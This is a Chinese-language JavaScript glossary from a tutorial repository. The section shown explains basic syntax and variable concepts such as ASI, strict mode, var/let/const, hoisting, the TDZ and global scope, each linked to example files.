# JavaScript 术语表

本文件收录 JavaScript 学习中会遇到的**术语**，每个术语给出**详细中文解释**，
并尽量链到本仓库中**讲解该术语的示例文件** —— 所以它既是词典，也是一张导航图。

> ⚙️ **本文件由 `npm run glossary` 自动生成**（源文件在 `.glossary_parts/`，按领域分册）。
> 不要手工编辑；改分册后重跑命令即可。

## 怎么用这份术语表

- **当词典查**：直接在本页搜索（`Ctrl+F` / `Cmd+F`），英文术语、中文译名、缩写都能搜到。
- **当导航用**：每个术语下方的 📄 链接会带你去仓库里讲它的示例文件，跟着读一遍比看解释更有效。
- **当复习清单用**：按领域通读一遍，凡是「看着眼熟但说不清」的，就是该补的地方。

关于范围：包含语言本身（语法、类型、异步、原型……）、运行时（Node.js、浏览器）、
以及实际开发会用到的工程概念（测试、构建、性能、安全）。**不包含**框架（React/Vue）与具体业务术语。

## 快速导航

| 领域 | 术语数 |
| --- | --- |
| [语言基础与变量声明](#语言基础与变量声明) | 42 |
| [数据类型与类型系统](#数据类型与类型系统) | 48 |
| [运算符与流程控制](#运算符与流程控制) | 60 |
| [函数与作用域闭包](#函数与作用域闭包) | 68 |
| [数组（Array）](#数组array) | 30 |
| [对象（Object）](#对象object) | 19 |
| [解构（Destructuring）](#解构destructuring) | 10 |
| [字符串（String）](#字符串string) | 19 |
| [数值（Number & Math）](#数值number-math) | 11 |
| [正则表达式（Regular Expressions）](#正则表达式regular-expressions) | 34 |
| [面向对象：类、this 与原型（OOP: Classes, `this` & Prototypes）](#面向对象类this-与原型oop-classes-this-prototypes) | 46 |
| [迭代器与生成器](#迭代器与生成器) | 19 |
| [异步编程](#异步编程) | 33 |
| [模块化](#模块化) | 17 |
| [错误处理](#错误处理) | 18 |
| [JSON](#json) | 15 |
| [日期与时间（22_date_and_time）](#日期与时间22_date_and_time) | 23 |
| [集合类型（23_collections）](#集合类型23_collections) | 16 |
| [二进制数据（24_typed_arrays）](#二进制数据24_typed_arrays) | 25 |
| [元编程：Proxy 与 Reflect（25_proxy_and_reflect）](#元编程proxy-与-reflect25_proxy_and_reflect) | 21 |
| [Node.js 运行时](#nodejs-运行时) | 50 |
| [浏览器与 Web API](#浏览器与-web-api) | 53 |
| [测试](#测试) | 30 |
| [第三方库与依赖](#第三方库与依赖) | 23 |
| [设计模式](#设计模式) | 43 |
| [性能与内存](#性能与内存) | 31 |
| [安全](#安全) | 37 |
| [国际化与本地化（Intl）](#国际化与本地化intl) | 28 |
| [现代 ES 特性（ECMAScript 演进）](#现代-es-特性ecmascript-演进) | 35 |
| [Web 加密（Web Crypto API）](#web-加密web-crypto-api) | 32 |
| [实时通信与流（WebSocket / SSE / Streams）](#实时通信与流websocket-sse-streams) | 22 |
| [调试与性能剖析](#调试与性能剖析) | 25 |
| [算法与数据结构](#算法与数据结构) | 58 |
| [工程化工具链](#工程化工具链) | 35 |
| [函数式编程](#函数式编程) | 36 |

**共 35 个领域、1112 条术语。**

---
## 语言基础与变量声明

### Program, Script, and Module（程序、脚本与模块）

三者描述的是「一段 JavaScript 代码」的三种存在形态，区别在于**作用域边界与加载方式**。**程序（program）**是规范层面的说法，指一个被完整解析执行的语法单元；**脚本（script）**以 `<script src>` 或 `node file.js` 的经典方式加载，其顶层声明直接落在全局作用域里，多个脚本会互相污染；**模块（module）**以 ESM（ECMAScript Module）形式加载，每个文件自带独立的模块作用域，只能通过 `import`/`export` 显式交互，且自动是严格模式、自动 defer、顶层 `this` 为 `undefined`。关键细节：同一个文件用 `<script>` 和 `<script type="module">` 加载，行为可能完全不同；本仓库 `package.json` 设了 `"type": "module"`，因此所有 `.js` 示例天然是模块。

**常见误解**：以为「文件」就等于「模块」——加了 `type="module"` 才是模块；也以为 `var` 在任何地方都是全局变量，在模块顶层它只属于该模块。

也见 [Host Environment（宿主环境）](#host-environment宿主环境)、[Module Scope（模块作用域）](#module-scope模块作用域)。

示例：[`19_modules/08_module_scope.js`](19_modules/08_module_scope.js)、[`00_hello_world/04_node_vs_browser.js`](00_hello_world/04_node_vs_browser.js)

### Statement（语句）

语句是执行一个「动作」的完整语法单位，典型特征是**没有值可供使用**（或值不被消费）。控制流程（`if`、`for`、`while`、`break`、`continue`）、声明（`var`/`let`/`const`、`function`、`class`）、`return`、`throw`、`try` 都是语句。一句话记忆：**表达式有值，语句做事**。判断某个位置能不能写语句，就看那里需不需要一个值——需要值的位置（如函数实参、`=` 右边、`return` 后面直接跟的东西）只能放表达式。

也见 [Expression（表达式）](#expression表达式)、[Expression Statement（表达式语句）](#expression-statement表达式语句)。

示例：[`01_syntax_basics/01_statements_and_expressions.js`](01_syntax_basics/01_statements_and_expressions.js)

### Expression（表达式）

表达式是**能求出一个值**的代码片段，因此可以被消费：赋给变量、作为实参、参与运算。字面量（`1`、`'a'`）、标识符引用（`x`）、算术与比较运算（`a + b`、`a > b`）、函数调用（`foo()`）、属性访问（`o.k`）、条件运算符（`a ? b : c`）、赋值本身（`x = 5`）都是表达式。关键细节：**赋值是表达式而不是语句**，它的值就是被赋的值，这正是链式赋值 `a = b = c = 0` 能成立的原因。一个实用的判定法：凡是能放在 `const x = ___` 右边的东西，都是表达式。

**常见误解**：以为 `if`、`for` 这类结构「也有返回值」——它们是语句，不能出现在表达式位置，需要用条件运算符等有值的写法替代。

也见 [Statement（语句）](#statement语句)、[Literal（字面量）](#literal字面量)。

示例：[`01_syntax_basics/01_statements_and_expressions.js`](01_syntax_basics/01_statements_and_expressions.js)

### Expression Statement（表达式语句）

表达式语句指「由一个表达式加上分号构成」的语句，也就是**光算不用的表达式**：`foo();`、`a = 1;`、`i++;`。它是真实代码里出现频率最高的语句形态。规范在这里做了一条重要限制：表达式语句**不能以 `{` 或 `function` 开头**（否则会被当作块语句或函数声明），所以 `{ a: 1 }` 在语句位置是「一个带标签的块」而不是对象字面量——想写对象字面量必须用括号包起来：`({ a: 1 });`。

**常见误解**：以为「表达式语句」和「表达式」是同一回事。区别在于是否被当作语句来求值：`a + b;` 是合法的表达式语句，但结果被直接丢弃，通常说明代码写错了。

也见 [Statement（语句）](#statement语句)、[Automatic Semicolon Insertion（自动分号插入）](#automatic-semicolon-insertion-asi自动分号插入)。

示例：[`01_syntax_basics/01_statements_and_expressions.js`](01_syntax_basics/01_statements_and_expressions.js)

### Automatic Semicolon Insertion / ASI（自动分号插入）

ASI 不是「猜你意思」的智能补全器，而是规范里写死的三条**极其严格**的补救规则：某个记号违反语法且其前面有换行时插入分号；遇到 `}` 仍不合法时插入分号；到达输入结尾（EOF）仍不合法时插入分号。核心要点是「**只有不加分号就语法错误时才会插入**」——如果两行不加分号也合法，解析器会毫不犹豫地把它们粘成一句，这正是所有坑的根源。因此当行首出现 `(`、`[`、模板字符串反引号、`+`、`-`、`/` 时极容易出事（`arr` 换行 `[0]` 会变成 `arr[0]`）。此外还有一组**受限产生式**：`return`/`throw`/`break`/`continue`/`yield` 后换行会**强制**插入分号，导致后面的值变成永远执行不到的孤立表达式。

**常见误解**：以为「换个行就等于加分号」。本仓库统一显式书写分号，正是因为 ASI 的边界情况反直觉且极易造成静默错误。

也见 [Expression Statement（表达式语句）](#expression-statement表达式语句)。

示例：[`01_syntax_basics/02_asi_and_semicolons.js`](01_syntax_basics/02_asi_and_semicolons.js)

### Comment（注释）

JS 只有两种注释语法：单行注释 `// ...`（到本行结束）与块注释 `/* ... */`（含换行，到最近的一个 `*/` 结束）。注释**不参与执行**，只服务于读代码的人；它该解释的是「为什么这样做」，而不是重复「做了什么」。关键细节：**块注释不能嵌套**，遇到第一个 `*/` 就终止，所以把一段已有块注释的代码整体注释掉会出问题；另外注释不能出现在会破坏分词语法的位置（例如 `a/*x*/b` 会被解析成 `a b`，而 `1/*x*/2` 反而可能触发 ASI 的怪异行为）。

**常见误解**：用注释「临时保留」死代码。主流实践是直接删掉——版本控制工具已经替你保存了历史。

也见 [JSDoc（JSDoc 文档注释）](#jsdocjsdoc-文档注释)。

示例：[`01_syntax_basics/03_comments.js`](01_syntax_basics/03_comments.js)

### JSDoc（JSDoc 文档注释）

JSDoc 是社区约定的一种**文档注释**写法：仍是用 `/*` 与 `*/` 包起来的块注释，但必须以 `/**` 开头（多一个星号，否则工具不识别），内部用 `@param`、`@returns`、`@throws`、`@example`、`@deprecated` 等标签描述函数契约。关键细节：**JSDoc 只是注释，运行时不产生任何效果**，但 VS Code 会读取它做悬停提示，TypeScript 编译器能据此做类型检查（相当于「不写 `.ts` 也能得到一部分类型安全」），TypeDoc 能据此生成文档网站。这使它成为给原生 JS 补类型的低成本手段。

**常见误解**：以为 JSDoc 会做运行时校验或影响性能——它完全不进运行时代码；也以为只要写了 `/*` 就算 JSDoc，其实必须是 `/**`。

也见 [Comment（注释）](#comment注释)、[Transpilation（转译）](#transpilation转译)。

示例：[`01_syntax_basics/03_comments.js`](01_syntax_basics/03_comments.js)

### Directive Prologue（指令序言）

指令序言是**出现在脚本或函数体最前面的一串字符串表达式语句**，它们长得像字符串字面量，但被引擎赋予了特殊含义。目前唯一被广泛实现的是 `'use strict';`；由于「必须位于最前」是硬性要求，写在中间或拼出来的字符串（如 `'use ' + 'strict'`）都只会被当成无用的表达式语句。关键细节：指令序言是少数「必须靠字面量形式」才生效的语法，这解释了为什么 `const s = 'use strict'; s;` 完全不起作用。ESM 不需要它——规范规定所有模块自动严格模式。

也见 [Strict Mode（严格模式）](#strict-mode严格模式)、[Sloppy Mode（非严格模式）](#sloppy-mode非严格模式松散模式)。

示例：[`01_syntax_basics/04_strict_mode.js`](01_syntax_basics/04_strict_mode.js)

### Strict Mode（严格模式）

严格模式是 ES5 引入的一套「更严格的解析与执行规则」，开启后一批历史上被默许的「静默失败」会变成明确报错。典型变化包括：未声明就赋值 → `ReferenceError`（不再偷偷创建全局变量）；给 `NaN`/`undefined`/只读属性赋值 → `TypeError`；函数参数重名 → `SyntaxError`；`with` 语句被禁用；八进制字面量 `0123` 必须写成 `0o123`；普通函数调用里的 `this` 是 `undefined` 而不是全局对象；`arguments.callee` 报错。开启方式有两种：脚本/函数开头写指令序言 `'use strict';`，或者使用 ESM——**所有模块都自动是严格模式**，不需要也不该再写那一行。

**常见误解**：以为严格模式只是「更啰嗦」，或者以为它是全局开关。它可以是**函数级**的：一个文件里只有带指令序言的那个函数变严格，其余照旧（本仓库因为是 ESM，所以全局生效）。

也见 [Sloppy Mode（非严格模式）](#sloppy-mode非严格模式松散模式)、[Implicit Global（隐式全局变量）](#implicit-global隐式全局变量)。

示例：[`01_syntax_basics/04_strict_mode.js`](01_syntax_basics/04_strict_mode.js)

### Sloppy Mode（非严格模式、松散模式）

Sloppy mode 是「未开启严格模式」的默认模式，规范中称为 non-strict mode，中文常译作松散模式或草率模式。它的存在是历史包袱：早期 JS 为了容错，把许多错误设计成静默忽略或静默兜底，例如给未声明的名字赋值会悄悄创建全局变量、函数内普通调用的 `this` 会兜底成全局对象、`delete` 删不掉的属性只是返回 `false`。关键细节：sloppy mode 依然能跑今天所有的新语法，差异**只体现在这些容错行为上**；由于现代工具链与 ESM 默认严格，实际项目中新代码几乎不会真正处于 sloppy mode。

**常见误解**：以为非严格模式「不能用 `let`/`const`/箭头函数」——完全能用，严格与非严格只影响行为规则，不影响语法可用性。

也见 [Strict Mode（严格模式）](#strict-mode严格模式)。

示例：[`01_syntax_basics/04_strict_mode.js`](01_syntax_basics/04_strict_mode.js)

### Identifier（标识符）

标识符是我们给变量、函数、类、属性、参数起的名字。硬性构成规则：首字符可以是字母、下划线 `_`、美元符 `$`，或 Unicode 中属于 `ID_Start` 的字符（中文、日文、希腊字母都合法）；后续字符在此基础上再加数字 `0-9`；不能以数字开头，不能包含连字符 `-`、空格、`!`、`@` 等。关键细节：**JS 严格区分大小写**，`name`、`Name`、`NAME` 是三个完全不同的标识符，这是从大小写不敏感的 SQL、部分 Windows 工具链过来的人最容易踩的坑。类私有字段的 `#` 前缀是独立的私有名语法，不属于普通标识符。

**常见误解**：以为「中文不能做变量名」——可以做（属于 `ID_Start`），但实践中一律不推荐，因为会造成编码与协作问题。

也见 [Reserved Word / Keyword（保留字、关键字）](#reserved-word-keyword保留字关键字)、[Naming Convention（命名约定）](#naming-convention命名约定)。

示例：[`01_syntax_basics/05_identifiers_and_naming.js`](01_syntax_basics/05_identifiers_and_naming.js)

### Reserved Word / Keyword（保留字、关键字）

关键字是语言保留给自身语法使用的词（`if`、`class`、`const`、`return`、`typeof`、`new`、`this`、`super`、`import`、`yield`…），保留字是不能用作标识符的名字，两者都**不能拿来当变量名、函数名或参数名**，否则直接 `SyntaxError`。除了当前关键字，规范还预留了未来保留字 `enum`，以及**严格模式下额外**保留的 `implements`、`interface`、`let`、`package`、`private`、`protected`、`public`、`static`、`yield`；此外 `null`、`true`、`false` 是字面量，同样不能作标识符。关键细节：`let`、`static` 这类词的身份**随模式而变**，同一段代码在严格/非严格下合法性可能不同。

**常见误解**：以为「属性名也不能用关键字」——属性访问与对象字面量的键可以用（`obj.delete`、`{ class: 1 }` 都合法）；受限的是**绑定标识符**的位置。

也见 [Identifier（标识符）](#identifier标识符)、[Literal（字面量）](#literal字面量)。

示例：[`01_syntax_basics/05_identifiers_and_naming.js`](01_syntax_basics/05_identifiers_and_naming.js)

### Literal（字面量）

字面量是**在源码里直接写死一个值**的语法，它是表达式最简单的形式：数字（`42`、`3.14`、`0o17`、`1_000_000`）、字符串（`'a'`、`"a"`、`` `a` ``）、布尔（`true`/`false`）、`null`、`undefined`、数组（`[1, 2]`）、对象（`{ a: 1 }`）、正则（`/ab+/g`）、BigInt（`1n`）、模板字符串等。关键细节：字面量在每次求值时会**创建一个新值**（对象与数组字面量尤其明显，`{} === {}` 为 `false`，因为不是同一个对象）；`null`、`true`、`false` 是保留字，不能用作标识符；而 `undefined` 不是关键字而是全局只读属性（在严格模式下不可写）。

**常见误解**：以为「字面量」和「常量」是同一回事——字面量是**源码写法**，常量是**绑定不可变**（`const`），一个 const 变量完全可以用非字面量初始化。

也见 [Expression（表达式）](#expression表达式)、[Declaration vs Initialization（声明与初始化）](#declaration-vs-initialization声明与初始化)。

示例：[`01_syntax_basics/05_identifiers_and_naming.js`](01_syntax_basics/05_identifiers_and_naming.js)

### Naming Convention（命名约定）

命名约定是社区软性风格规则（违反也能跑，但会破坏可读性）：`camelCase`（小驼峰）用于变量、函数、方法、对象属性，如 `userName`、`getUserById`；`PascalCase`（大驼峰）用于类、构造函数、以及 React 组件；`UPPER_SNAKE_CASE` 用于「约定为常量」的值，如 `MAX_RETRY_COUNT`、`API_BASE_URL`。补充约定：私有/内部成员常用 `_` 前缀（如本仓库用 `_` 开头标记辅助模块，运行脚本会跳过它们），谓词函数常用 `is`/`has`/`can` 开头，异步函数可考虑 `fetch`/`load` 之类的动词前缀。关键细节：`UPPER_SNAKE_CASE` **不带来任何语言层面的不可变性**，它只是「别改我」的社交信号，真正的保护要靠 `const` 与 `Object.freeze`。

**常见误解**：以为全大写就等于常量、等于不可变——它只是命名习惯。

也见 [Identifier（标识符）](#identifier标识符)、[const](#const)、[Reassignment vs Immutability（不可重新赋值 vs 不可变）](#reassignment-vs-immutability不可重新赋值-vs-不可变)。

示例：[`01_syntax_basics/05_identifiers_and_naming.js`](01_syntax_basics/05_identifiers_and_naming.js)

### Variable Declaration（变量声明）

变量声明是「把一个名字引入当前作用域」的语法动作，JS 提供三种声明关键字：`var`、`let`、`const`（此外还有函数声明、类声明、`import`、函数参数、`catch` 参数等也会引入绑定）。理解声明的关键是把一个声明拆成两件事：**创建绑定（声明）**与**赋予初始值（初始化/赋值）**——两者的时机不同，这正是提升与 TDZ 的全部根源。选择策略也很简单：默认用 `const`，需要重新赋值时用 `let`，**不要再用 `var`**（除了维护老代码）。关键细节：不使用任何关键字直接 `x = 1` 不是声明，那是隐式全局赋值，严格模式下直接报错。

也见 [Declaration vs Initialization（声明与初始化）](#declaration-vs-initialization声明与初始化)、[var](#var)、[let](#let)、[const](#const)。

示例：[`02_variables/05_var_let_const_compare.js`](02_variables/05_var_let_const_compare.js)

### var

`var` 是最古老的变量声明方式（ES1 就有），其行为由三条特性定义：**函数作用域**（属于最近的函数体，`if`/`for`/`while` 的花括号不构成边界）、**变量提升**（声明提到作用域顶部，赋值留在原地，提升后赋值为 `undefined` 而非报错）、**可重复声明**（同作用域内 `var` 同一名字多次不报错，后声明的声明部分被忽略、赋值照常执行）。此外在普通脚本顶层，`var` 会成为全局对象（`globalThis`）的属性且**不可删除**，这是它与隐式全局变量的重要区别。今天写新代码基本不需要 `var`，但必须读懂它：大量 2015 年前的存量代码、老库、复制粘贴片段仍在用它。

**常见误解**：以为 `var` 是「全局变量」。它只有在顶层才挂到全局对象上；在函数里它是**函数局部**的，只是不受块限制。

也见 [Function Scope（函数作用域）](#function-scope函数作用域)、[Hoisting（变量提升）](#hoisting变量提升)、[let](#let)、[const](#const)。

示例：[`02_variables/01_var.js`](02_variables/01_var.js)

### let

`let` 是 ES2015 引入的变量声明方式，用来取代 `var` 的三处设计失误，其特性与 `var` 恰好相反：**块级作用域**（可见范围是最近一对花括号，含 `if`/`for`/`while`/`switch`/`try` 与裸块）、**暂时性死区 TDZ**（声明执行前访问直接抛 `ReferenceError`，而不是给 `undefined`）、**不可重复声明**（同作用域内 `let` 两次同名是解析期 `SyntaxError`）。它有一个极其重要的附带收益：`for (let i = ...)` 每轮迭代产生**新的 `i` 绑定**，这正是修复「循环里创建闭包都捕获同一个变量」这一经典陷阱的关键。顶层 `let` 不会成为 `globalThis` 的属性。

**常见误解**：以为「`let` 不提升」。`let` 同样提升，只是提升后处于未初始化状态（TDZ），效果表现为报错而非 `undefined`。

也见 [Temporal Dead Zone（暂时性死区）](#temporal-dead-zone-tdz暂时性死区)、[Block Scope（块级作用域）](#block-scope块级作用域)、[var](#var)、[const](#const)。

示例：[`02_variables/02_let.js`](02_variables/02_let.js)、[`07_scope_and_closure/08_closure_loop_pitfall.js`](07_scope_and_closure/08_closure_loop_pitfall.js)

### const

`const` 与 `let` 一样是块级作用域、有 TDZ、不可重复声明，但多了两条约束：**声明时必须初始化**（`const a;` 直接 `SyntaxError: Missing initializer`），且**绑定不可重新赋值**（`a = 2` 抛 `TypeError: Assignment to constant variable`）。关键在于「不可变」修饰的是**绑定**而不是**值**：`const arr = [1, 2]` 之后 `arr.push(3)` 完全合法（改的是数组内容），而 `arr = [0]` 会报错（改的是绑定）。想真正锁住内容需要 `Object.freeze`（且只是浅冻结）。实践建议：**默认写 `const`**，只在确实需要重新赋值时降级为 `let`。

**常见误解**（本术语最常见的误解）：以为 `const` 让对象/数组变得不可修改。它只保证「这个名字永远指向同一个值」，对象内部照样可以增删改。

也见 [Reassignment vs Immutability（不可重新赋值 vs 不可变）](#reassignment-vs-immutability不可重新赋值-vs-不可变)、[let](#let)、[var](#var)。

示例：[`02_variables/03_const.js`](02_variables/03_const.js)

### Block Scope（块级作用域）

块级作用域指「最近一对花括号」构成的作用域边界，`let`、`const`、`class` 以及函数声明（在严格模式/模块中）都遵循它。构成块的语法包括裸块 `{ }`、`if`/`else`、`for`/`for...of`/`for...in`、`while`、`switch` 的 `case`（整个 switch 是一个块）、`try`/`catch`、函数体。关键细节：`for` 循环的头部用 `let` 声明时，**每次迭代都会创建一个新的绑定**并复制上一轮的值，这使得每轮创建的闭包各自捕获独立的变量；`catch (e)` 的参数也天然是块级的。

**常见误解**：以为「只要写了花括号就有块作用域」——块的**内容**必须用 `let`/`const` 声明才受边界约束，`var` 会直接穿透出去。

也见 [Function Scope（函数作用域）](#function-scope函数作用域)、[let](#let)、[Shadowing（变量遮蔽）](#shadowing变量遮蔽)。

示例：[`07_scope_and_closure/03_block_scope.js`](07_scope_and_closure/03_block_scope.js)、[`02_variables/02_let.js`](02_variables/02_let.js)

### Function Scope（函数作用域）

函数作用域指「最近的函数体」构成的作用域边界，是 `var`（以及函数声明）唯一认的边界。在函数内用 `var` 声明的变量，无论写在多深的 `if`/`for` 里，实际上都属于这个函数，函数外部一律访问不到。它同时也是**参数、`arguments`、函数自身的名字**所在的作用域。关键细节：与块级作用域相对，函数作用域是「粗粒度」的——嵌套多少层花括号都不影响 `var` 的归属；这也是历史上「IIFE（立即调用函数表达式）」被用来模拟私有作用域的原因：在 `let` 出现前，只有函数能造出新作用域。

**常见误解**：以为「函数作用域 = 全局作用域」。函数内 `var` 是局部的；另外注意 ESM 中模块顶层还有一层模块作用域，`var` 到不了 `globalThis`。

也见 [Block Scope（块级作用域）](#block-scope块级作用域)、[var](#var)、[Module Scope（模块作用域）](#module-scope模块作用域)。

示例：[`07_scope_and_closure/02_function_scope.js`](07_scope_and_closure/02_function_scope.js)、[`02_variables/01_var.js`](02_variables/01_var.js)

### Hoisting（变量提升）

`var` 与函数声明会在作用域创建阶段被「登记」，因此能在书写位置之前使用：`var` 提升后值为 `undefined`，函数声明则整体可用（连函数体一起提升，所以可以在定义前调用）。`let`/`const`/`class` 同样被提升，但处于**暂时性死区（TDZ）**，声明前访问抛 `ReferenceError`。核心认知：**「提升」不是代码被移动，而是声明提前登记、赋值留在原地**——这正是 `var` 只提升声明不提升值的原因。函数表达式（`var f = function () {}`）按 `var` 规则处理，因此调用时必须已经执行过赋值那一行。

**常见误解**：以为「变量和函数都被提到最顶部」。实际上提升只发生在**各自的作用域内**（函数内的 `var` 不会跑到全局），且提升的是声明而非赋值。

也见 [Temporal Dead Zone（暂时性死区）](#temporal-dead-zone-tdz暂时性死区)、[Declaration vs Initialization（声明与初始化）](#declaration-vs-initialization声明与初始化)。

示例：[`02_variables/04_hoisting_and_tdz.js`](02_variables/04_hoisting_and_tdz.js)

### Temporal Dead Zone / TDZ（暂时性死区）

TDZ 描述的是用 `let`/`const`/`class` 声明的绑定「**已创建但尚未初始化**」的那段时间——从进入作用域开始，到声明语句执行完成为止。在这段时间里任何读写该绑定都会抛 `ReferenceError: Cannot access 'x' before initialization`。关键细节：TDZ 是**按时间**而不是按位置划分的，同一个块里 `if (false) { let x; }` 之后的代码并不会受影响，因为那段声明根本不会执行；TDZ 之外还有一个著名陷阱——**`typeof` 在 TDZ 中同样会抛错**，这与「对完全未声明的变量用 `typeof` 会安全返回 `'undefined'`」形成鲜明对比。顺带一提：函数参数的默认值也有自己的 TDZ，会阻止访问函数体内声明的 `let`。

**常见误解**：以为 TDZ 是「语法错误」或「访问不到」。变量确实已经存在，只是被禁止访问；且这个错误是**运行时**才发生的，声明前的代码若不执行就不会报错。

也见 [Hoisting（变量提升）](#hoisting变量提升)、[let](#let)、[const](#const)。

示例：[`02_variables/04_hoisting_and_tdz.js`](02_variables/04_hoisting_and_tdz.js)

### Redeclaration（重复声明）

重复声明指在同一作用域内对同一个名字声明两次。三种关键字的规则完全不同：`var` **允许**重复声明，后一次的声明部分被静默忽略、赋值照常执行（所以 `var a = 1; var a = 2;` 合法，`a` 最终是 2）；`let`/`const` **禁止**重复声明，同作用域内两次同名是**解析期** `SyntaxError`（代码根本不会开始执行）；同一个名字先用 `var` 再用 `let`（或反序）也一律报错。关键细节：禁止的是**同一作用域内**的重复；在内层作用域重新声明同名变量是合法的，那叫遮蔽。

**常见误解**：以为重复声明只在严格模式下报错——`let`/`const` 的重复声明在任何模式下都是 `SyntaxError`；也以为报错发生在运行时，实际上它在**解析阶段**就抛出。

也见 [Shadowing（变量遮蔽）](#shadowing变量遮蔽)、[var](#var)、[let](#let)。

示例：[`02_variables/05_var_let_const_compare.js`](02_variables/05_var_let_const_compare.js)

### Reassignment vs Immutability（不可重新赋值 vs 不可变）

这是两个常被混为一谈的概念。**不可重新赋值（no reassignment）**是绑定的属性：`const` 保证这个名字不再指向别的值，`let`/`var` 允许改指。**不可变（immutable）**是值的属性：对象被创建后其属性不能再被修改，JS 里没有任何声明关键字能提供这个保证，只能靠 `Object.freeze`（浅冻结，且非严格模式下静默失败、严格模式下抛 `TypeError`）、`Object.seal`、`Object.preventExtensions`，或干脆使用不可变数据结构。因此「`const` 对象的属性可以改」并不矛盾：`const` 管的是绑定，管不到值的内部结构。

**常见误解**：把「const 变量」等同于「常量值」。准确说法是「const 绑定」，能否修改内容取决于值的类型（原始值天然不可变，对象/数组可变）。

也见 [const](#const)、[Naming Convention（命名约定）](#naming-convention命名约定)。

示例：[`02_variables/03_const.js`](02_variables/03_const.js)

### Global Variable（全局变量）

全局变量是「在程序任何地方都能访问到」的变量，但要分两个层次理解：**全局对象**（宿主提供的那个最外层对象，浏览器是 `window`、Node 是 `global`、Worker 是 `self`、统一引用是 `globalThis`）与**全局作用域里的绑定**（写在最外层的 `var`/`let`/`const`/`function` 声明）。关键在于两者并不等同：在普通脚本里顶层 `var` 与函数声明会成为全局对象的属性且**不可删除**，而顶层 `let`/`const` 只存在于全局词法环境中，**不出现在全局对象上**；在 ESM 里更是全部限制在模块作用域内。实践建议是能不用就不用：全局变量无法被垃圾回收、任何地方都能改、名字冲突无法察觉，模块导出是更好的共享方式。

**常见误解**：以为「顶层写的变量就是 `globalThis` 上的属性」。写 `let a = 1` 之后 `globalThis.a` 是 `undefined`；也以为在 ESM 里顶层 `var` 能挂到 `globalThis`——不能。

也见 [Global Object（全局对象）](#global-object全局对象)、[globalThis](#globalthis)、[Implicit Global（隐式全局变量）](#implicit-global隐式全局变量)。

示例：[`02_variables/06_global_variables.js`](02_variables/06_global_variables.js)

### Implicit Global（隐式全局变量）

隐式全局变量指**从未用任何关键字声明**、直接赋值而产生的东西：`x = 1`（前提是 `x` 此前从未声明）。在**非严格模式**下，引擎会悄悄在全局对象上创建一个属性（可被 `delete` 删除），既不报错也不提示；在**严格模式**下，这会立刻抛 `ReferenceError: x is not defined`。它是 bug 的常见来源：拼错变量名（`userNmae = ...`）不会报错，只是悄悄多了一个全局变量，Windows 上的「赋值给只读属性」也会静默失败。这也是严格模式最被称道的收益之一：把这类笔误从「诡异数据」变成「响亮报错」。

**常见误解**：以为隐式全局是「语言特性」——它是早期容错设计的遗留；也以为它和顶层 `var` 一样不可删除，实际上隐式创建的属性是可删除的。

也见 [Strict Mode（严格模式）](#strict-mode严格模式)、[Global Object（全局对象）](#global-object全局对象)。

示例：[`02_variables/06_global_variables.js`](02_variables/06_global_variables.js)

### Global Object（全局对象）

全局对象是宿主环境提供的「最外层对象」，承载着全局作用域可访问的属性与方法：浏览器里是 `window`（同时 `window.window === window`，并兼任页面窗口对象），Node.js 里是 `global`（一个纯粹的命名空间容器，没有窗口概念），Web Worker 里是 `self`。关键细节：**全局对象上的内容大部分来自宿主而非语言**——`console`、`setTimeout`、`fetch` 是宿主注入的，而 `Object`、`Array`、`JSON`、`Math`、`Promise` 才是 ECMAScript 定义的内置对象；此外，`var` 与函数声明、隐式全局都会落在全局对象上，`let`/`const` 则不会。ES2020 起语言层面统一提供了 `globalThis`，不必再写 `window || global || self` 这种兼容代码。

**常见误解**：以为浏览器里「全局对象 = 全局作用域」。它是全局作用域的一部分，但 `let`/`const` 声明的名字能通过作用域访问、却不作为它的属性存在。

也见 [globalThis](#globalthis)、[Global Variable（全局变量）](#global-variable全局变量)、[Host Environment（宿主环境）](#host-environment宿主环境)。

示例：[`02_variables/06_global_variables.js`](02_variables/06_global_variables.js)、[`00_hello_world/04_node_vs_browser.js`](00_hello_world/04_node_vs_browser.js)

### globalThis

`globalThis` 是 ES2020 引入的**标准全局对象引用**，无论代码跑在浏览器、Node.js、Web Worker 还是其他宿主里，它都指向当前环境的全局对象。在此之前，同一句「取全局对象」的代码要写成 `typeof window !== 'undefined' ? window : global` 之类的探测，既不优雅也容易漏掉环境。关键细节：它是**属性**而不是关键字，因此可以被遮蔽或重新赋值（例如 `function f(globalThis) {}` 是合法的），这点与 `this` 类似而与 `null` 不同；此外，模块作用域的存在使得「在模块里写顶层 `var` 就能在 `globalThis` 上看到」这个假设不成立。

**常见误解**：以为 `globalThis` 就等同于「全局作用域」。它只是访问全局**对象**的入口，`globalThis.x` 与全局词法环境中的 `let x` 是两套不同的东西。

也见 [Global Object（全局对象）](#global-object全局对象)、[Global Variable（全局变量）](#global-variable全局变量)。

示例：[`02_variables/06_global_variables.js`](02_variables/06_global_variables.js)

### Shadowing（变量遮蔽）

变量遮蔽指内层作用域声明了一个与外层同名的变量，于是内层在可见范围内「挡住」了外层那个。它本身完全合法（只要不是**同一作用域内**的重复声明），是模块化与函数复用中无法避免的现象：函数参数遮蔽外层变量、`catch (e)` 遮蔽外层的 `e`、块内的 `let x` 遮蔽函数中的 `x`。关键细节：遮蔽是**逐层向上查找作用域链**的自然结果，被遮蔽的外层变量并没有消失，只是当前层看不到；如果内层想要访问被遮蔽的外层值，只能靠提前保存到另一个名字（或改用对象属性）。滥用遮蔽会让代码难以阅读，工具（ESLint 的 `no-shadow`）通常会警告。

**常见误解**：以为「同名变量会互相覆盖」。在嵌套作用域里它们各自独立、互不影响；只有同作用域重复声明才是错误（`let`/`const`）或覆盖（`var`）。

也见 [Redeclaration（重复声明）](#redeclaration重复声明)、[Block Scope（块级作用域）](#block-scope块级作用域)。

示例：[`07_scope_and_closure/03_block_scope.js`](07_scope_and_closure/03_block_scope.js)

### Declaration vs Initialization（声明与初始化）

这是把一个变量「引入存在」的两步，分清楚它们才能理解提升与 TDZ：**声明（declaration）**是把名字注册到当前作用域；**初始化 / 赋值（initialization / assignment）**是给它一个值。三种关键字的组合方式不同：`var a = 1` 会先声明并初始化为 `undefined`（提升阶段），执行到该行才赋成 1；`let a = 1` 同样是先声明，但保持未初始化（TDZ），执行到该行才同时完成初始化；`const a = 1` 强制要求在同一句里完成声明与初始化，否则 `SyntaxError: Missing initializer in const declaration`。也就是说，「声明」是解析期概念，「初始化」是执行期动作——两者的时间差就是 TDZ 的长度。

**常见误解**：以为 `var a;` 是「先声明再赋值 `undefined`」。准确说法是声明与「初始化为 `undefined`」在提升阶段一起完成，赋值语句只负责改值。
